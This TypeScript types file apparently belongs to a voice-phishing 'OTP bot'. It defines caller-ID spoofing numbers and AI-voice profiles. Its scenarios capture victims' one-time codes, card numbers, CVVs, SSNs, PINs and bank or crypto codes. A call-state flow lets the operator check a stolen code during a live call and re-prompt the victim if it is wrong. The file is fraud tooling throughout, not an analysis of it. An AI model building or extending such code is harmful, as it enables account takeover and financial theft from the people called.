export interface VoiceProfile { // Renamed from Script to VoiceProfile for clarity
  id: string; 
  userid: string;
  name: string; 
  voice: string; // ElevenLabs Voice ID or name
}

export interface AppSettings {
  botToken?: string; // Optional as it might be backend only
  ngrokUrl: string;
  twilioAccountSid: string;
  twilioAuthToken: string; // Should be masked or managed server-side
  twilioPhoneNumber: string;
  elevenLabsApiKey: string; // Should be masked or managed server-side
  spoofNumbers: string[];
  defaultSpoofNumber: string;
  publicChatId?: string; // Optional
}

export enum ScenarioType {
  GENERIC_OTP = 'GENERIC_OTP',
  PGP_FORWARD = 'PGP_FORWARD',
  CARD_INFO = 'CARD_INFO',
  SSN_INFO = 'SSN_INFO',
  PIN_CAPTURE = 'PIN_CAPTURE',
  EMAIL_CODE = 'EMAIL_CODE',
  BANK_OTP = 'BANK_OTP',
  CVV_CAPTURE = 'CVV_CAPTURE',
  CRYPTO_OTP = 'CRYPTO_OTP',
  MICROSOFT_OTP = 'MICROSOFT_OTP',
}

export interface CallParamField {
  name: keyof CallParams;
  label: string;
  type: 'text' | 'number' | 'textarea';
  placeholder?: string;
  required?: boolean;
}

export interface CallScenario {
  type: ScenarioType;
  displayName: string;
  description: string;
  fields: CallParamField[];
  backendRouteTemplate: string; // e.g., /voice/{targetNumber}/{spoofNumber}/{service}/{name}/{otpDigits}
                                // Actual {chatid} and {tag} are usually added by backend
  expectsOtpValidation?: boolean; // New flag to indicate if scenario involves OTP validation by UI
}

export interface CallParams {
  targetNumber?: string;
  spoofNumber?: string;
  service?: string;
  name?: string; // victim name
  otpDigits?: string;
  forwardToNumber?: string;
  bankName?: string;
  cvvDigits?: string;
  last4DigitsCard?: string;
  // Add more as needed from Python routes
}

export interface InitiateCallPayload extends CallParams {
  scenarioType: ScenarioType;
  selectedVoiceId: string; // ElevenLabs Voice ID from VoiceProfile
}

// Types for live call interaction
export type LiveCallUiState = 
  | 'IDLE'
  | 'INITIATING'
  | 'OTP_PENDING_USER_VALIDATION' // Call active, backend captured OTP, awaiting UI decision
  | 'SUBMITTING_OTP_DECISION'
  | 'REPROMPTING_VICTIM'          // OTP denied, backend is re-prompting
  | 'CALL_PROCEEDING'             // OTP accepted or scenario doesn't need OTP validation from UI
  | 'COMPLETED'
  | 'FAILED';

export interface CapturedOtpDetails {
  otpValue: string;
  message?: string; // e.g., "Victim entered OTP. Please validate."
}

export interface ActiveCallSession {
  callId: string;
  scenarioType: ScenarioType;
  uiState: LiveCallUiState;
  statusMessage: string; // General status message for the UI
  capturedOtp?: CapturedOtpDetails | null; // Details of the OTP captured by backend
  lastAttemptedOtp?: string; // Store the OTP for which a decision was just made
}

export interface InitiateCallResponse {
  success: boolean;
  message: string;
  callId?: string;
  initialUiState?: LiveCallUiState; // Backend suggests the initial state for the UI
}

export interface SubmitOtpDecisionResponse {
  success: boolean;
  message: string;
  nextUiState: LiveCallUiState; // Backend dictates the next UI state
  newOtpDetails?: CapturedOtpDetails | null; // If re-prompted, new OTP might be here
}
